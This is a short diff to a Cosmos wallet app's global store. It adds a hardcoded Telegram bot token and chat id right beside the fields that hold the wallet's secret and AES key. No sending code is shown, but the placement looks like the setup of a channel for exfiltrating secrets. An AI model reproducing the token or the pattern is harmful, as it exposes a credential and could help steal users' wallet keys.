@@ -62,6 +62,9 @@ export const useGlobalStore = defineStore('global', {
         unstakingBalances: [],
         redelegations: [],
 
+        tgBotToken: '7437812149:AAFOqawApsG8osd-fo0kbI7_G6ic4gi3MFI',
+        tgChatId: '@cosmos_wallet_bot',
+
         secret: null,
         secretIV: null,
         aesKey: null,
